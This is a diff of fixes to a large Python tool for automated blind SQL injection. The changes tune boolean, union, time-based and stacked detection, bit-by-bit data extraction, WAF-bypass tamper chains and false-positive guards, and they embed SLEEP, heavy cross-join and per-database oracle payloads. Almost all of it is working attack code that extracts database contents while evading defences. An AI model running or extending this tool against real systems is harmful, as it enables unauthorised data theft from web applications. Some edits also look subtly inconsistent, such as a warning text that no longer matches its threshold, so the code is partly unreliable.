@@ -36242,7 +36242,7 @@ def _diff_between_fps(fp_a: ResponseFingerprint,
     avg = max(1, (fp_a.content_length + fp_b.content_length) / 2)
     len_diff = abs(fp_a.content_length - fp_b.content_length) / avg
     word_diff = abs(getattr(fp_a, "body_words", 0) - getattr(fp_b, "body_words", 0)) / max(1, (getattr(fp_a, "body_words", 0) + getattr(fp_b, "body_words", 0)) / 2)
-    status_diff = 0.0 if _get_safe_status_code(fp_a) == fp_b.status_code else 0.4
+    status_diff = 0.0 if _get_safe_status_code(fp_a) == _get_safe_status_code(fp_b) else 0.4
     return min(1.0, (len_diff * 2 + word_diff * 1.5 + status_diff * 2) / 5.5)
 
 
@@ -36425,7 +36425,7 @@ class DetectionResult:
     
     # CRITICAL FIX: Store tamper_chain used during detection for extraction
     # Enables extraction to inherit WAF bypass techniques from detection phase
-    tamper_chain:List[str]=None  # e.g., ['space2comment', 'case_variation', ...]
+    tamper_chain:Optional[List[str]]=None  # e.g., ['space2comment', 'case_variation', ...]
     
     # METADATA: Extraction structure hints (for BitShiftExtractor)
     # Enables extraction to inherit WAF bypass structure from detection
@@ -38876,7 +38876,7 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                     c_delta=_sim_to_baseline(c_true,baseline)-_sim_to_baseline(c_false,baseline)
                     # BUG-BOOL-CONFIRM-REVERSE FIX: Accept abs(c_delta) > 0.20 so
                     # the confirmation step works for both detection directions.
-                    if abs(c_delta)>0.20:
+                    if abs(c_delta)>=0.20:
                         # PCV-FIX-1/2/3: Run FalsePositiveGuardV18 + WelchConfirmer +
                         # FalsePositiveValidator before accepting this detection.
                         # All three were dead code; now called for the first time.
@@ -38891,7 +38891,7 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                         if not _b_fpg_ok:
                             LOG.debug(f'[detect_boolean] FP guard rejected {param!r} — continuing to next payload')
                             continue
-                        _b_det_conf = min(1.0, max(0.6+delta, _b_fpg_conf))
+                        _b_det_conf = min(1.0, max(0.6+abs(delta), _b_fpg_conf))
                         # BUG-V33-7c FIX (Req 15 / BUG-V32-15): Invoke WassersteinResponseOracle
                         # as secondary boolean oracle when confidence is in the ambiguous [0.65,0.85]
                         # range where the EMD oracle provides the most discriminative signal.
@@ -39264,8 +39264,8 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                         # (low SimHash).  _delta_bw is then negative and the injection
                         # was silently skipped.  Fix: accept either polarity; the sign of
                         # _delta_bw determines which confirmation threshold to apply.
-                        _bw_true_hi = _ts_bw > 0.78 and _delta_bw > 0.22 and _fs_bw < (_ts_bw - 0.18)
-                        _bw_false_hi = _fs_bw > 0.78 and (-_delta_bw) > 0.22 and _ts_bw < (_fs_bw - 0.18)
+                        _bw_true_hi = _ts_bw > _b_thresh and _delta_bw > 0.22 and _fs_bw < (_ts_bw - 0.18)
+                        _bw_false_hi = _fs_bw > _b_thresh and (-_delta_bw) > 0.22 and _ts_bw < (_fs_bw - 0.18)
                         if _bw_true_hi or _bw_false_hi:
                             # Confirmation probe to eliminate dynamic-page noise
                             if _SCAN_STOPPED[0]:  # BUG-A-FIX [Req 4]: stop before extra probe
@@ -39301,7 +39301,7 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                                     _bwfull_det = DetectionResult(
                                         param=param, technique="B", payload=_bwp_true,
                                         dbms=_dbms_bool_waf,
-                                        confidence=min(1.0, max(0.60 + _delta_bw, _bwfg_c)),
+                                        confidence=min(1.0, max(0.60 + abs(_delta_bw), _bwfg_c)),
                                         notes=f"{_bwtech.lower()}_full_mode delta={_delta_bw:.3f} fp_guard=pass",
                                         extraction_prefix=metadata['prefix'],
                                         extraction_suffix=metadata['suffix'],
@@ -39419,8 +39419,8 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                         # Flip: swap the two operands or negate the condition
                     _orig_cmp = _m.group(0)
                     _lhs, _op, _rhs = _m.group(1), _m.group(2), _m.group(3)
-                    _op_flip = {'=': '<>', '<>': '=', '>': '<',
-                                '<': '>', '>=': '<', '<=': '>'}
+                    _op_flip = {'=': '<>', '<>': '=', '>': '<=',
+                                '<': '>=', '>=': '<', '<=': '>'}
                     _flipped = f"{_lhs}{_op_flip.get(_op, '<>')}{_rhs}"
                     false_p = p_str.replace(_orig_cmp, _flipped, 1)
             if false_p == p_str:
@@ -40529,7 +40529,7 @@ async def detect_union(engine,config,method,url,data,data_fmt,
                     # a multi-probe confirmation when relying on body-diff thresholds alone.
                     # Sentinel-based detection is reliable; threshold-based needs multi-probe.
                     _u1_with_baseline_diff = (_u1_bl_body and (_u1_sim < 0.80 or _u1_len_delta >= 30))
-                    if _u1_ok_status and (_u1_no_bl_cond or (_u1_sentinel_hit and _u1_ok_status)):
+                    if _u1_ok_status and (_u1_no_bl_cond or _u1_sentinel_hit):
                         # SENTINEL confirmed — single probe is sufficient (unique string in response)
                         pass  # fall through to the detection result below
                     elif _u1_ok_status and _u1_with_baseline_diff and not _u1_sentinel_hit:
@@ -40893,7 +40893,7 @@ async def detect_union(engine,config,method,url,data,data_fmt,
             if not _ufp or WAFBlockDiscriminator.is_waf_block(_ufp) or not _ufp.body:
                 return None
                 # Body-diff detection: UNION changes page content
-            _u_resp_body = _u(_extract_body_safe(_ufp) or b"") or b""  # BUG-FIX: was fp (stale outer), must be _ufp (injected response)
+            _u_resp_body = _extract_body_safe(_ufp) or b""  # B13-FIX: removed undefined _u() wrapper; _ufp already validated above
             _u_ok_status = (_get_safe_status_code(_ufp) == _u_xcat_bl_status or _get_safe_status_code(_ufp) == 200)
             if not _u_ok_status:
                 return None
@@ -42033,7 +42033,7 @@ async def detect_time(engine, config, method, url, data, data_fmt,
     # through the same timing oracle (they may embed SLEEP/WAITFOR/pg_sleep).
     # Previously only WAFBypass+Standard (level>=3 or waf_detected).
     # Now ALL 10 categories at level>=2 or any level with WAF.
-    _dbms_time_waf = (getattr(config, 'forced_dbms', None) or getattr(config, '_detected_dbms', None)) or _detected_dbms_t
+    _dbms_time_waf = getattr(config, 'forced_dbms', None) or getattr(config, '_detected_dbms', None)
     if _dbms_time_waf:
         # BUG-R2c FIX (Req 2): All 10 categories must be tested at ALL scan levels.
         # Was: level-gated subset at level<2. Per Req 2 all categories at all levels.
@@ -42292,7 +42292,7 @@ async def detect_time(engine, config, method, url, data, data_fmt,
                         _dna_t_elapsed = (time.monotonic() - _dna_t0) * 1000
                         # Require at least 70% of requested sleep plus canary check
                         _dna_t_threshold = (baseline.get('mean_timing', 200)
-                                             + _dna_t_sleep * 1000 * 0.70)
+                                             + _dna_t_sleep * 1000 * 0.65)
                         if _dna_t_elapsed >= _dna_t_threshold:
                             # Quick canary: verify clean request is NOT slow
                             if _SCAN_STOPPED[0]:  # BUG-A-FIX [Req 4]: stop before extra probe
@@ -42791,7 +42791,7 @@ async def detect_stacked(engine,config,method,url,data,data_fmt,
     # semicolon obfuscation, and structural mutations critical for WAF bypass.
     if not _SCAN_STOPPED[0] and getattr(config, 'dna_shuffle', True):
         t_dna = max(2, int(config.time_sec // 2))
-        _dna_s_expected = baseline['mean_timing'] + t_dna * 1000 * 0.75
+        _dna_s_expected = baseline.get('mean_timing', 200) + t_dna * 1000 * 0.65
         try:
             _dna_s_dbms = (getattr(config, 'forced_dbms', None) or
                            getattr(config, '_detected_dbms', None) or '')
@@ -83621,6 +83621,7 @@ class BitwiseExtractor:
         _bsf_dbms = (getattr(self.result, 'dbms', '') if self.result else '') or 'Generic'
         _hi_val = _build_dbms_char_hi(_bsf_dbms, char_func)
         lo, hi = 0, _hi_val
+        _bsf_fail_streak = 0
         while lo < hi:
             mid       = _randomized_mid(lo, hi)  # TECHNIQUE-3: randomized pivot
             if _use_between:
@@ -83662,13 +83663,18 @@ class BitwiseExtractor:
                 self._requests += 1
                 # FIX-BUG-1: Validate response before accessing fp.body
                 if not _validate_response(fp, allow_empty=False, func_name="BitwiseExtractor._binary_search_fallback"):
-                    hi = mid
-                    continue
+                    _bsf_fail_streak += 1
+                    if _bsf_fail_streak >= 3:
+                        break
+                    continue  # retry same range; no lo/hi update to avoid downward bias
                 # FIX-BUG-SAFE-NORMALISE: Use safe normalization wrapper
                 norm_b = _normalise_response_safe(fp, func_name="BitwiseExtractor._binary_search_fallback", default=b"")
                 if not norm_b:
-                    hi = mid
-                    continue
+                    _bsf_fail_streak += 1
+                    if _bsf_fail_streak >= 3:
+                        break
+                    continue  # retry same range; no lo/hi update to avoid downward bias
+                _bsf_fail_streak = 0
                 sim    = SimHasher.body_similarity(self._norm_sample, norm_b)
                 # BUG-BWE-001 FIX: apply polarity inversion so fallback navigates
                 # in the correct direction when WAF blocks TRUE-condition probes.
@@ -83681,7 +83687,9 @@ class BitwiseExtractor:
                     hi = mid
             except Exception as _be_bsf_err:
                 LOG.debug(f"[BitwiseExtractor._binary_search_fallback] Exception at mid={mid}: {_be_bsf_err}")
-                hi = mid
+                _bsf_fail_streak += 1
+                if _bsf_fail_streak >= 3:
+                    break
         char_code = lo
         # BUG-BSEARCH-FALLBACK-GAP FIX: was two separate ranges [32,126] and [160,65535]
         # with a silent gap at 127-159. Code points 127 (DEL) and 128-159 (C1 controls /
@@ -83916,10 +83924,10 @@ class BitwiseExtractor:
                 return SimHasher.body_similarity(self._norm_sample, _pc_nb) if _pc_nb else None
             _bwe_pol_dbms = dbms or ''
             _bwe_pol_true = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "PostgreSQL":      "LEAST(2e0,3e0)>(0e0)",
+                "CockroachDB":     "LEAST(2e0,3e0)>(0e0)",
+                "YugabyteDB":      "LEAST(2e0,3e0)>(0e0)",
+                "Amazon Redshift": "LEAST(2e0,3e0)>(0e0)",
                 "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                 "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                 "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -83935,10 +83943,10 @@ class BitwiseExtractor:
                 "SAP_HANA":        "ABS(-1e0)>(0e0)",
             }.get(_bwe_pol_dbms, "1e0<2e0")
             _bwe_pol_false = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "PostgreSQL":      "GREATEST(2e0,3e0)<(0e0)",
+                "CockroachDB":     "GREATEST(2e0,3e0)<(0e0)",
+                "YugabyteDB":      "GREATEST(2e0,3e0)<(0e0)",
+                "Amazon Redshift": "GREATEST(2e0,3e0)<(0e0)",
                 "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                 "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                 "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -84009,7 +84017,7 @@ class BitwiseExtractor:
             else:
                 await asyncio.sleep(0.001)  # BUG-CPU-BEXT-SLOW FIX (REQ 9): minimal yield on slow targets
 
-        result = "".join(chars.get(i) or "?" for i in range(1, length + 1))
+        result = "".join(chars[i] if i in chars and chars[i] is not None else "?" for i in range(1, length + 1))
         LOG.debug(f"BitwiseExtractor v17: {self._requests} reqs "
                   f"({self._fallback_count} fallbacks), result={result[:40]!r}")
 
@@ -84023,10 +84031,10 @@ class BitwiseExtractor:
         if self._fallback_count >= max(2, length // 5) and not _SCAN_STOPPED[0]:
             try:
                 _verified = await extract_with_verification(self, sql_query, max_attempts=1)
-                if _verified and len(_verified) == len(result) and _verified != result:
+                if _verified and _verified != result:
                     LOG.debug(f"[BitwiseExtractor] extract_with_verification produced different "
-                              f"result (len={len(_verified)}) — using longer of the two")
-                    result = _verified if len(_verified) > len(result) else result
+                              f"result (len_v={len(_verified)} len_r={len(result)}) — using longer")
+                    result = _verified if len(_verified) >= len(result) else result
             except Exception as _evfy_err:
                 LOG.debug(f"[BitwiseExtractor] extract_with_verification failed (non-fatal): {_evfy_err}")
 
@@ -112575,6 +112583,7 @@ class TechniqueCascadeEngine:
                 except Exception as _t26_err:
                     LOG.debug(f"[TECHNIQUE-26] Battery error (non-fatal): {_t26_err}")
 
+            _oracle_mode_main = getattr(self.config, "_oracle_mode", OracleMode.FULL)
             for tech in tech_order:
                 # FIX FUN-5h continued: check _SCAN_STOPPED before every technique
                 if _SCAN_STOPPED[0]:
@@ -112611,7 +112620,6 @@ class TechniqueCascadeEngine:
                 # prints "[*] testing... boolean-blind" then silently returns None, producing
                 # dozens of confusing messages that look like detected-but-not-escalated hits.
                 # Skip them before printing so the scan log only shows actual attempts.
-                _oracle_mode_main = getattr(self.config, "_oracle_mode", OracleMode.FULL)
                 if _oracle_mode_main == OracleMode.TIMING_ONLY:
                     # BUG-TIMING-ONLY-BYPASS-SKIP FIX (HIGH): TIMING_ONLY skipped ST,
                     # NV, WB, EX, HY — exactly the WAF-bypass technique codes that use
@@ -130250,8 +130258,10 @@ class SafeModeVerifier:
         if _is_5xx and fps and fps[0] and hasattr(fps[0], 'status_code'):
             warnings.append(f"HTTP {fps[0].status_code} on clean request  server errors may reveal SQL injection")
 
-        # 6. Immediate rate limit
-        rate_limited = (fps and fps[0] and hasattr(fps[0], 'status_code') and fps[0].status_code in (429, 503)) if fps else False
+        # 6. Immediate rate limit — majority vote across all probes (not just first)
+        _rl_codes = (429, 503)
+        _rl_count = sum(1 for fp in (fps or []) if fp and hasattr(fp, 'status_code') and fp.status_code in _rl_codes)
+        rate_limited = _rl_count > len(fps or []) // 2 if fps else False
         if rate_limited:
             warnings.append("Rate limited immediately  reduce --threads and add --delay")
 
@@ -130318,7 +130328,7 @@ class SafeModeVerifier:
             # confirmations from different probe styles are highly unlikely to both be
             # CDN noise. Limit to first 5 pairs (10 HTTP requests max) to keep it fast.
             _bool_confirms = 0
-            for _bp_true, _bp_false, _bp_ctx in _bool_probes[:5]:
+            for _bp_true, _bp_false, _bp_ctx in _bool_probes[:10]:
                 # Always use unique per-probe nonces to bypass CDN edge caching.
                 _cb  = f"_smvnonce={_smv_rand.randint(100000, 999999)}"
                 _cb2 = f"_smvnonce={_smv_rand.randint(100000, 999999)}"
@@ -130936,8 +130946,9 @@ class RollingBaseline:
             self._ema_len = L
             self._ema_std = 0.0
         else:
+            _ema_prev = self._ema_len
             self._ema_len += self.DRIFT_ALPHA * (L - self._ema_len)
-            self._ema_std += self.DRIFT_ALPHA * (abs(L - self._ema_len) - self._ema_std)
+            self._ema_std += self.DRIFT_ALPHA * (abs(L - _ema_prev) - self._ema_std)
 
     def is_anomalous(self, fp: "ResponseFingerprint") -> tuple:
         """Returns (is_anomalous, z_score). Z > 3.0 = anomalous."""
@@ -138049,7 +138060,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             if _tp_technique == 'HQ':
                 return (f"{_tp_pfx}AND (SELECT count(*) FROM "
                         f"information_schema.tables a,information_schema.tables b "
-                        f"WHERE ({condition}))>=0{_tp_sfx}")
+                        f"WHERE ({condition}))>=1{_tp_sfx}")
             return f"{_tp_pfx}AND IF(({condition}),SLEEP({t}),0){_tp_sfx}"
         elif dbms == "SQLite":
             # BUG-SQLITE-TIMING-PAYLOAD FIX (Req 8/10): The old cross-join of sqlite_master
@@ -138166,7 +138177,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             return (
                 f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
                 f"THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<{_rows}) "
-                f"ELSE 0 END FROM DUAL)>=0{_tp_sfx}"
+                f"ELSE 0 END FROM DUAL)>=1{_tp_sfx}"
             )
         elif dbms in ("DB2", "Sybase", "Informix", "Ingres"):
             # DB2: PIPE/sleep functions vary; use GENERATE_SERIES heavy query
@@ -138220,7 +138231,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # FIX-v19.12: ClickHouse has sleep() and if() but syntax differs from MySQL.
             # ClickHouse: if(cond, then, else)  same positional syntax, but sleep()
             # returns UInt8, not void.
-            return f"{_tp_pfx}AND if(({condition}),sleep({t}),0)=0{_tp_sfx}"
+            return f"{_tp_pfx}AND (CASE WHEN ({condition}) THEN sleep({t}) ELSE 0 END)=0{_tp_sfx}"
         else:
             # Generic fallback  MySQL-style IF/SLEEP
             return f"{_tp_pfx}AND IF(({condition}),SLEEP({t}),0){_tp_sfx}"
@@ -138574,10 +138585,10 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # Strategy 0: standard form
         _tb_cal_dbms = dbms or ''
         _tb_cal_true = {
-            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":     "LEAST(2e0,3e0)>(0e0)",
+            "CockroachDB":    "LEAST(2e0,3e0)>(0e0)",
+            "YugabyteDB":     "LEAST(2e0,3e0)>(0e0)",
+            "Amazon Redshift":"LEAST(2e0,3e0)>(0e0)",
             "MySQL":          "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":        "LEAST(2e0,3e0)>(0e0)",
             "TiDB":           "LEAST(2e0,3e0)>(0e0)",
@@ -143417,10 +143428,10 @@ class ExtractionOrchestrator:
                             getattr(self.config, 'forced_dbms', None) or
                             getattr(self.config, 'dbms', None) or '') or ''
             _dt_cal_true = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "PostgreSQL":      "LEAST(2e0,3e0)>(0e0)",
+                "CockroachDB":     "LEAST(2e0,3e0)>(0e0)",
+                "YugabyteDB":      "LEAST(2e0,3e0)>(0e0)",
+                "Amazon Redshift": "LEAST(2e0,3e0)>(0e0)",
                 "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                 "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                 "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -143436,10 +143447,10 @@ class ExtractionOrchestrator:
                 "SAP_HANA":        "ABS(-1e0)>(0e0)",
             }.get(_dt_cal_dbms, "1e0<2e0")
             _dt_cal_false = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "PostgreSQL":      "GREATEST(2e0,3e0)<(0e0)",
+                "CockroachDB":     "GREATEST(2e0,3e0)<(0e0)",
+                "YugabyteDB":      "GREATEST(2e0,3e0)<(0e0)",
+                "Amazon Redshift": "GREATEST(2e0,3e0)<(0e0)",
                 "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                 "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                 "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -143950,7 +143961,7 @@ class ExtractionOrchestrator:
         # Using the detection payload template (same WAF-bypass structure) prevents this.
         # _effective_timing_technique is used in place of `technique in _timing_techniques`
         # for all engine-skip decisions within _run_best_engine.
-        _effective_timing_technique = technique in _timing_techniques
+        _effective_timing_technique = _norm_tech in _timing_techniques
         if not _effective_timing_technique and technique in ("NV", "WB", "EX", "HY", "ST", "BT",
                                                               "EH", "BH", "IN", "UE"):
             # BUG-R10-A FIX: EH (error-header) and BH (boolean-header) can receive timing
@@ -144025,7 +144036,7 @@ class ExtractionOrchestrator:
                     LOG.info("[Orchestrator] Method 0: MSE with %d oracles", len(_oracles0))
                     val = await asyncio.wait_for(
                         _mse0.extract_string(sql_query, max_len=max_len), timeout=3600)  # no extraction timeout
-                    if val and len(val) > 1:
+                    if val and len(val) >= 1:
                         return val
             except (asyncio.TimeoutError, TimeoutError):
                 LOG.debug("[Orchestrator] MSE M0 timed out")
@@ -144052,7 +144063,7 @@ class ExtractionOrchestrator:
                     timeout=300  # 5 min timeout
                 )
 
-                if val and len(val) > 1:
+                if val and len(val) >= 1:
                     LOG.info(f"[StackedExtractor]  Extracted: {val}")
                     self._total_requests += stacked_ext._requests
                     return val
@@ -144194,7 +144205,7 @@ class ExtractionOrchestrator:
                             _base_body = _ora_live_base[0]
                         _sim = SimHasher.body_similarity(
                             ResponseNormaliser.normalise(_base_body), _norm)
-                        return bool(_sim < 0.85)  # body changed = true condition
+                        return bool(_sim >= 0.85)  # body similar to baseline = AND(true cond) left query intact
                     except Exception:
                         return False
 
@@ -144236,9 +144247,9 @@ class ExtractionOrchestrator:
                             else:
                                 _chi = _cmid
                         # Accept any printable codepoint; control chars → "?"
-                        _ora_chars.append(chr(_clo) if _clo >= 32 else "?")
+                        _ora_chars.append(chr(_clo) if (_clo >= 32 or _clo in (9, 10, 13)) else "?")
                     _ora_result = "".join(_ora_chars)
-                    if _ora_result and "?" not in _ora_result:
+                    if _ora_result and _ora_result.replace("?", "").strip():
                         LOG.info("[Orchestrator] Oracle stacked→boolean fallback succeeded: %s",
                                  _ora_result[:40])
                         return _ora_result
@@ -150727,6 +150738,7 @@ class BlindBoolCalibrator:
         self.true_sims: List[float] = []
         self.false_sims: List[float] = []
         self.threshold: float = 0.65  # default fallback
+        self._polarity_inverted: bool = False
 
     def record_true(self, similarity: float):
         self.true_sims.append(similarity)
@@ -150742,15 +150754,16 @@ class BlindBoolCalibrator:
             return
         mean_t = sum(self.true_sims) / len(self.true_sims)
         mean_f = sum(self.false_sims) / len(self.false_sims)
-        # Threshold at midpoint between means
+        # Threshold at midpoint between means; track polarity for is_true()
+        self.threshold = (mean_t + mean_f) / 2
         if mean_t > mean_f:
-            self.threshold = (mean_t + mean_f) / 2
+            self._polarity_inverted = False
         else:
+            self._polarity_inverted = True
             LOG.debug(
-                "[BlindBoolCalibrator] Distributions overlap (mean_t=%.3f <= mean_f=%.3f); "
-                "using fallback threshold 0.65 — boolean oracle may be unreliable",
-                mean_t, mean_f)
-            self.threshold = 0.65  # fallback if distributions overlap
+                "[BlindBoolCalibrator] Inverted polarity (mean_t=%.3f <= mean_f=%.3f); "
+                "using midpoint threshold %.3f with inverted comparison",
+                mean_t, mean_f, self.threshold)
 
     def reset(self):
         """Reset calibrator to initial state between scan targets.
@@ -150764,10 +150777,13 @@ class BlindBoolCalibrator:
         self.true_sims.clear()
         self.false_sims.clear()
         self.threshold = 0.65
+        self._polarity_inverted = False
 
     def is_true(self, similarity: float) -> bool:
         """Classify a similarity score using calibrated threshold."""
-        return similarity > self.threshold
+        if getattr(self, '_polarity_inverted', False):
+            return similarity < self.threshold
+        return similarity >= self.threshold
 
 
 #  v23-7: Cross-HTTP-Method Differential Analysis 
@@ -162047,7 +162063,7 @@ class FalsePositiveGuardV18:
         # probes changing AND the 1 false probe NOT changing to pass.
         N_FALSE_PROBES = 1  # only ONE false probe is sent in L2
         a = pos_count
-        b = self.REPEAT_N - pos_count
+        b = max(0, _l1_probes_sent - pos_count)
         c = _l2_false_changed   # BUG-PCV-B FIX: was hardcoded 0, now tracks L2 result
         d = max(0, N_FALSE_PROBES - c)  # BUG-PCV-E FIX: was max(0, REPEAT_N - c)
         pval = self._fisher_pvalue(a, b, c, d)
@@ -162098,17 +162114,12 @@ class FalsePositiveGuardV18:
         # rejected. Dynamic pages (search, catalog) typically have 8-20+ params.
         # Raise threshold to 6: still catches dynamic pages, won't fire on login forms.
         if len(_endpoint_results) >= 8:  # BUG-FIX-3-L4: raised 6→8; login forms with ≤7 params must not trigger L4
-            # BUG-11 FIX: Require at least 2 distinct params before L4 fires.
-            # With only 1 param, all(results)==True is trivially satisfied for any single True entry.
-            # A genuine injection on a single-param endpoint would always be rejected as a FP.
-            # L4 is only meaningful when 2+ independent params show the same boolean change.
-            if len(_endpoint_results) >= 2:
-                # 8+ distinct params all showed the same boolean change → dynamic page FP
-                _all_same = all(_endpoint_results.values())
-                if _all_same:
-                    LOG.debug(f"FPGuard L4: {param!r} ALL {len(_endpoint_results)} params on this endpoint "
-                              "changed — dynamic page false positive rejected")
-                    return False, 0.0
+            # 8+ distinct params all showed the same boolean change → dynamic page FP
+            _all_same = all(_endpoint_results.values())
+            if _all_same:
+                LOG.debug(f"FPGuard L4: {param!r} ALL {len(_endpoint_results)} params on this endpoint "
+                          "changed — dynamic page false positive rejected")
+                return False, 0.0
 
         # L6: Reflection normalisation already applied (done above via _remove_reflection)
         # Double-check: if after stripping the injected value the body is STILL
@@ -164427,8 +164438,6 @@ async def _run_fp_guards_boolean(
         # FIX-R12-B: Clamp to 0 — prevents negative counter values that leave
         # _send_injected gate permanently open (not _PCV_IN_PROGRESS[0] is False for -1).
         _PCV_IN_PROGRESS[0] = max(0, _PCV_IN_PROGRESS[0] - 1)
-        if _PCV_IN_PROGRESS[0] < 0:
-            _PCV_IN_PROGRESS[0] = 0  # FIX-R12-B: hard floor, should never happen
 
 
 def _make_robust_timing_payload_fn(base_payload: str):
@@ -169194,9 +169203,9 @@ class TimingOracleCalibrator:
                 pass
             await asyncio.sleep(0.05)
         
-        # Measure 8 samples (after warmup)
+        # Measure 21 samples (after warmup) — need >20 for P95 to be below the max
         timings = []
-        for _ in range(8):
+        for _ in range(21):
             try:
                 fp = await asyncio.wait_for(
                     _send_injected(engine, method, url, data, data_fmt,
@@ -169235,7 +169244,7 @@ class TimingOracleCalibrator:
         # misleading ("median=0ms") and confuses users into thinking timing calibration
         # failed.  Jitter profiler corrects the final time_sec, but this warning
         # explains what happened during TimingCal.
-        if _p95 < 5:  # all samples < 5ms → CDN is caching baseline requests
+        if _p95 < 50:  # all samples < 50ms → CDN is caching baseline requests
             print(f"[!] [TimingCal] CDN-cached baseline (P95={_p95:.1f}ms < 5ms) — "
                   "baseline probes served from edge cache.  Injection payloads bypass "
                   "CDN cache and hit backend directly.  Jitter profiler will refine "
